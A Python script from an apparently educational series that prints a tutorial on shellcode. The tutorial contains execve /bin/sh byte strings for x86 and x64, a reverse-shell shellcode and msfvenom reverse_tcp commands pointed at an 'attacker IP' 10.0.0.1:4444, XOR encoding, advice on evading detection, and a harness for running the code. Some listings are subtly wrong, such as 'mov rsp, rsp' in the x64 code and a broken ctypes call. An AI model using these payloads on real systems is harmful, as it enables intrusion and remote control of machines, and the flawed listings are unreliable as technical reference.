#!/usr/bin/env python3
"""
Shellcode Generator - Project 51
Generate position-independent shellcode for exploits.

EDUCATIONAL USE ONLY. Only use on systems you own or have permission to test.
"""

import sys

def main():
    print("""
╔════════════════════════════════════════════════════════════════╗
║     Shellcode Generator - Project 51                          ║
║                                                                ║
║     EDUCATIONAL USE ONLY                                       ║
║     Only use on systems you own or have permission to test    ║
╚════════════════════════════════════════════════════════════════╝

WHAT IS SHELLCODE?

Shellcode is raw machine code that executes after exploitation.
It's called \"shellcode\" because historically it spawned a shell.

CHARACTERISTICS:

- Position independent (no absolute addresses)
- Null-byte free (for string functions)
- Small size (handles overflow limits)
- Self-contained (no external calls)

COMMON SHELLCODE TYPES:

| Type | Purpose |
|------|---------|
| Exec /bin/sh | Spawn shell |
| Reverse Shell | Connect back to attacker |
| Bind Shell | Listen for connection |
| Meterpreter | Full-featured payload |

LINUX x86 SHELLCODE (Exec /bin/sh):

\\x31\\xc0              # xor eax, eax
\\x50                  # push eax
\\x68\\x2f\\x2f\\x73\\x68  # push '//sh'
\\x68\\x2f\\x62\\x69\\x6e  # push '/bin'
\\x89\\xe3              # mov ebx, esp
\\x50                  # push eax
\\x50                  # push eax
\\x53                  # push ebx
\\x89\\xe1              # mov ecx, esp
\\xb0\\x0b              # mov al, 11 (sys_execve)
\\xcd\\x80              # int 0x80

LINUX x64 SHELLCODE (Exec /bin/sh):

\\x48\\x31\\xff              # xor rdi, rdi
\\x48\\x31\\xf6              # xor rsi, rsi
\\x48\\x31\\xd2              # xor rdx, rdx
\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68  # mov rax, '/bin//sh'
\\x50                      # push rax
\\x48\\x89\\xfc              # mov rsp, rsp
\\x48\\x31\\xf6              # xor rsi, rsi
\\x48\\x31\\xd2              # xor rdx, rdx
\\x48\\xb0\\x3b              # mov al, 59 (sys_execve)
\\x0f\\x05                  # syscall

REVERSE SHELL SHELLCODE (Linux x86):

# Connect to attacker IP (10.0.0.1:4444)
\\x31\\xc0\\x31\\xdb\\x31\\xf6\\x31\\xd2\\x52\\x68\\x02\\x01\\x10\\x11\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x52\\x53\\x89\\xe1\\xb0\\x03\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80

ALphanumeric SHELLCODE:

Sometimes need alphanumeric shellcode (no nulls, A-Z, a-z, 0-9).
Uses creative encoding to work around restrictions.

METASPLOIT SHELLCODE:

# Generate with msfvenom
msfvenom -p linux/x86/shell_reverse_tcp \\
    LHOST=10.0.0.1 LPORT=4444 -f python

# Windows payload
msfvenom -p windows/meterpreter/reverse_tcp \\
    LHOST=10.0.0.1 LPORT=4444 -f c

# Staged vs Unstaged
# Staged: small downloader, then full payload
# Unstaged: entire payload in single piece

SHELLCODE ENCODING:

# XOR encoding
original = shellcode
key = 'A'
encoded = ''.join(chr(b ^ ord(key)) for b in original)

# Then decode and execute:
# mov key, 'A'
# decode_loop:
#   xor byte [edi], key
#   inc edi
#   loop decode_loop

AVOIDING DETECTION:

1. Encrypt/shellcode
2. Custom encoding
3. Polymorphic (change but stay functional)
4. Use system calls directly (no libc)

TESTING SHELLCODE:

# In C program
unsigned char buf[] = \"\\x31\\xc0...\\x90\";
void (*fp)() = (void (*)())buf;
fp();

# In Python
import ctypes
ctypes.cdll.LoadLibrary(\"./shellcode.so\").execute()

IMPORTANT NOTES:

[!] Shellcode must be carefully crafted to avoid:
    - Null bytes (\\x00)
    - Newlines (\\x0a)
    - Slashes (\\x2f) sometimes
    - Any characters that might terminate strings

[!] Always test in sandboxed environment first
[!] Address layout varies - calculate based on target

""")

if __name__ == "__main__":
    main()